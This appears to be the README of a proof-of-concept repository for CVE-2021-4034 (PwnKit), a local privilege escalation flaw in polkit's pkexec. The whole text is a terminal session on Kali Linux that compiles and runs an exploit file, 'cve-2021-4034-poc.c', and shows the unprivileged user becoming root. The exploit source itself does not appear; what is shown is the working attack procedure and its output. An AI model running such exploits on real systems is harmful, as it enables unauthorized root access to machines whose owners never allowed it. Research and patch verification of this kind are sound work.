# CVE-2021-4034
PoC CVE 2021-4034 PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec

#PoC
Verified on Kali.

```
┌──(kali㉿kali)-[~/Documents]
└─$ grep PRETTY /etc/os-release                
PRETTY_NAME="Kali GNU/Linux Rolling"

──(kali㉿kali)-[~/Documents]
└─$ lsb_release -a
No LSB modules are available.
Distributor ID: Kali
Description:    Kali GNU/Linux Rolling
Release:        2021.4
Codename:       kali-rolling

┌──(kali㉿kali)-[~/Documents]
└─$ id
uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(wireshark),122(bluetooth),134(scanner),143(kaboxer)
                                                                                                                                                                                                                                       
┌──(kali㉿kali)-[~/Documents]
└─$ gcc cve-2021-4034-poc.c -o cve-2021-4034-poc
                                                                                                                                                                                                                                       
┌──(kali㉿kali)-[~/Documents]
└─$ ./cve-2021-4034-poc                        
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(wireshark),122(bluetooth),134(scanner),143(kaboxer),1000(kali)
# whoami
root
#
```
